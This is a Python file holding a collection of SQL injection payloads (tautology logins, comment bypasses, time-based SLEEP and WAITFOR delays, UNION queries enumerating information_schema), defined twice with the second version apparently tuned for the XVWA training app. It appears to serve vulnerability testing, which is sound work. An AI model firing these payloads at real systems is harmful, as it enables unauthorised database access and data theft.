"""
SQL injection payloads for testing SQL injection vulnerabilities
"""

class SQLiPayloads:
    """SQL injection payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic SQL injection payloads"""
        return [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1 OR 1=1"
        ]
    
    @staticmethod
    def get_time_based_payloads():
        """Get time-based SQL injection payloads"""
        return [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "1; SELECT SLEEP(5)",
            "' UNION SELECT SLEEP(5)--"
        ]
    
    @staticmethod
    def get_union_payloads():
        """Get UNION-based SQL injection payloads"""
        return [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name FROM information_schema.tables--"
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all SQL injection payloads"""
        return (SQLiPayloads.get_basic_payloads() + 
                SQLiPayloads.get_time_based_payloads() + 
                SQLiPayloads.get_union_payloads())
class SQLiPayloads:
    """SQL injection payload collection optimized for XVWA"""
    
    @staticmethod
    def get_basic_payloads():
        """Basic SQL injection payloads that work on XVWA"""
        return [
            "'",
            "''",
            "\"",
            "\"\"",
            "')",
            "'))",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1/*",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\"--",
            "\" OR 1=1--",
            "\" OR 1=1/*",
            "' OR 'a'='a",
            "' OR 'a'='a'--",
            "\" OR \"a\"=\"a",
            "\" OR \"a\"=\"a\"--",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "\") OR (\"1\"=\"1",
            "\") OR (\"1\"=\"1\"--",
            "admin'--",
            "admin\"--",
            "admin'/*",
            "admin\"/*",
            "' OR 1=1 LIMIT 1--",
            "\" OR 1=1 LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "\" OR 1=1 ORDER BY 1--",
            "' GROUP BY 1--",
            "\" GROUP BY 1--",
            "' HAVING 1=1--",
            "\" HAVING 1=1--"
        ]

    @staticmethod
    def get_union_payloads():
        """UNION-based SQL injection payloads for XVWA"""
        return [
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT 1--",
            "' UNION ALL SELECT 1,2--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT user()--",
            "' UNION SELECT version()--",
            "' UNION SELECT database()--",
            "' UNION SELECT @@version--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
            "' ORDER BY 5--",
            "' ORDER BY 10--",
            "' ORDER BY 100--"
        ]

    @staticmethod
    def get_time_based_payloads():
        """Time-based SQL injection payloads for XVWA"""
        return [
            "' OR SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR 1=1 AND SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1 AND SLEEP(5)--",
            "1' OR SLEEP(5)--",
            "1 OR SLEEP(5)--"
        ]
